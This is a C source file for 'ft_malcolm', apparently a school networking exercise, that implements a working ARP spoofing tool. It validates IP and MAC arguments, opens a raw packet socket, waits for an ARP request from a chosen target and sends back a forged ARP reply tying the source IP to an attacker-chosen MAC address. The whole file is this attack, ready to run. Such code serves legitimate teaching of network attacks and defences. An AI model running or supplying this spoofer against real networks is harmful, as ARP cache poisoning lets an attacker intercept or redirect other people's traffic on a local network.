#include "ft_malcolm.h"

int compare_bytes(void *ptr1, void *ptr2, int size) {
    for (int i = 0; i < size; i++) {
        if (((char *)ptr1)[i] != ((char *)ptr2)[i]) {
            return 0;
        }
    }
    return 1;
}

int ip_pton(char *ipaddr, uint8_t ip_num[4]) {
    return !inet_pton(AF_INET, ipaddr, ip_num);
}

int check_is_hexa(char *str) {
    if (*str == '*' && *(str + 1) == '*') {
        return 1;
    }

    while (*str) {
        int is_hexa = (*str >= 'a' && *str <= 'f') || (*str >= '0' && *str <= '9') || (*str >= 'A' && *str <= 'F');
        if (!is_hexa) {
            return 0;
        }
        str++;
    }
    return 1;
}

int validate_mac_addr(char *macadd) {
    char segments[6][3];
    bzero(segments, sizeof(segments));

    int count = 0;
    while (*macadd) {
        int segment_len = 0;
        while (*macadd && *macadd != ':' && segment_len < 2) {
            segments[count][segment_len] = *macadd;
            macadd++;
            segment_len++;
        }

        count++;

        if ((*macadd != ':' && count < 6) || (!*macadd && count != 6) || (count == 6 && *macadd) || segment_len == 0) {
            return 0;
        }
        if (*macadd) {
            macadd++;
        }
    }

    for (int i = 0; i < 6; i++) {
        if (!check_is_hexa(segments[i])) {
            return 0;
        }
    }

    return 1;
}

int find_usable_interface() {
    struct ifaddrs *ifaddr, *ethadd;
    int if_index = 0;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return 0;
    }

    for (ethadd = ifaddr; ethadd != NULL; ethadd = ethadd->ifa_next) {
        if (ethadd->ifa_addr == NULL || ethadd->ifa_addr->sa_family != AF_PACKET) {
            continue;
        }

        void *macaddr = ((struct sockaddr_ll *)(ethadd->ifa_addr))->sll_addr;
        if (compare_bytes(macaddr, "\x00\x00\x00\x00\x00\x00", 6)) {
            continue;
        }

        if_index = if_nametoindex(ethadd->ifa_name);
        if (if_index > 0) {
            char *mac_address = ether_ntoa((void *)((struct sockaddr_ll *)(ethadd->ifa_addr))->sll_addr);
            printf("Found available interface: %s with MAC address: %s\n", ethadd->ifa_name, mac_address);
            break;
        }
    }

    freeifaddrs(ifaddr);
    return if_index;
}

uint8_t hex_to_int(char *hex) {
    int res = 0;
    char digits[] = "0123456789abcdef";

    while (*hex) {
        char c = *hex;
        if (c >= 'A' && c <= 'F') {
            c += ('a' - 'A');
        }

        int i = 0;
        while (digits[i] != c && digits[i]) {
            i++;
        }

        res = res * 16 + i;
        hex++;
    }

    return res;
}

int mac_pton(char *mac, uint8_t mac_num[6]) {
    if (!validate_mac_addr(mac)) {
        dprintf(2, "ft_malcolm: invalid MAC address: (%s)\n", mac);
        return 1;
    }

    int i = 0;
    while (i < 6 && *mac) {
        char byte[3];
        int j = 0;
        bzero(byte, sizeof(byte));

        while (*mac && *mac != ':') {
            byte[j] = *mac;
            j++;
            mac++;
        }

        mac_num[i] = hex_to_int(byte);

        if (!*mac) {
            break;
        }
        mac++;
        i++;
    }

    return 0;
}

char *mac_ntop(uint8_t mac_num[6]) {
    static char mac_str[18];

    sprintf(mac_str, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", mac_num[0], mac_num[1], mac_num[2], mac_num[3], mac_num[4], mac_num[5]);
    return mac_str;
}

int process_packet(char *buff, ssize_t read_bytes, struct arp_options *opt) {
    if ((long unsigned int)read_bytes < ARP_SIZE) {
        printf("received %ld bytes\n", read_bytes);
        return 1;
    }

    struct ether_header *eth = (struct ether_header *)buff;
    struct arp_header *arp = (void *)(buff + sizeof(*eth));

    if (ntohs(eth->ether_type) != ETHERTYPE_ARP || ntohs(arp->opcode) != 1) {
        printf("not an ARP request\n");
        return 1;
    }

    if (!compare_bytes(eth->ether_shost, opt->target_mac, 6) ||
        !compare_bytes(arp->sender_ip, opt->target_ip, 4) ||
        !compare_bytes(arp->target_ip, opt->source_ip, 4)) {
        printf("wrong MAC or IP addr\n");
        return 1;
    }

    printf("\nReceived an ARP request:\n");
    printf("\tMAC address: %s\n", mac_ntop((void *)eth->ether_shost));
    char ip_addr[16];
    printf("\tIP address: %s\n", inet_ntop(AF_INET, arp->sender_ip, ip_addr, sizeof(ip_addr)));

    return 0;
}

int send_arp_reply(int sockfd, struct sockaddr_ll *sockaddr, struct arp_options *opt) {
    char reply[ARP_SIZE];

    struct ether_header *eth_hdr_reply = (void *)reply;
    memcpy(eth_hdr_reply->ether_dhost, opt->target_mac, 6);
    memcpy(eth_hdr_reply->ether_shost, opt->source_mac, 6);
    eth_hdr_reply->ether_type = htons(ETH_P_ARP);

    struct arp_header *arp_reply = (void *)(reply + sizeof(*eth_hdr_reply));
    arp_reply->htype = htons(1);         // Hardware type (Ethernet is 1)
    arp_reply->ptype = htons(ETH_P_IP);  // Protocol type (IPv4 is 0x0800)
    arp_reply->hlen = 6;                 // Hardware address length (6 for MAC)
    arp_reply->plen = 4;                 // Protocol address length (4 for IPv4)
    arp_reply->opcode = htons(2);        // Operation (1 for request, 2 for reply)

    memcpy(arp_reply->sender_mac, opt->source_mac, 6);
    memcpy(arp_reply->sender_ip, opt->source_ip, 4);
    memcpy(arp_reply->target_mac, opt->target_mac, 6);
    memcpy(arp_reply->target_ip, opt->target_ip, 4);

    ssize_t len = sendto(sockfd, reply, sizeof(reply), 0, (void *)sockaddr, sizeof(*sockaddr));
    if (len == -1) {
        dprintf(2, "ft_malcolm: sendto: %s\n", strerror(errno));
        return 1;
    }

    printf("Sent an ARP reply to the target address with spoofed source\n");
    return 0;
}

void print_usage() {
    dprintf(2, "Usage: ft_malcolm <source_ip> <source_mac> <target_ip> <target_mac>\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        print_usage();
        return 1;
    }

    int if_index = 0;

    struct arp_options opt = {0};
    if (ip_pton(argv[1], opt.source_ip) || mac_pton(argv[2], opt.source_mac) || ip_pton(argv[3], opt.target_ip) || mac_pton(argv[4], opt.target_mac)) {
        return 1;
    }

    if (!(if_index = find_usable_interface())) {
        return 1;
    }

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        dprintf(2, "ft_malcolm: socket: %s\n", strerror(errno));
        return 1;
    }

    struct sockaddr_ll sockaddr = {0};
    socklen_t addr_len = sizeof(sockaddr);

    while (1) {
        char buff[1024];

        ssize_t read_bytes = recvfrom(sockfd, (void *)buff, sizeof(buff), 0, (void *)&sockaddr, &addr_len);
        if (read_bytes == -1) {
            dprintf(2, "ft_malcolm: recvfrom: %s\n", strerror(errno));
            continue;
        }

        if (process_packet(buff, read_bytes, &opt)) {
            continue;
        }

        if (send_arp_reply(sockfd, &sockaddr, &opt)) {
            continue;
        }

        break;
    }

    close(sockfd);
    printf("\nSee ya!\n");
    return 0;
}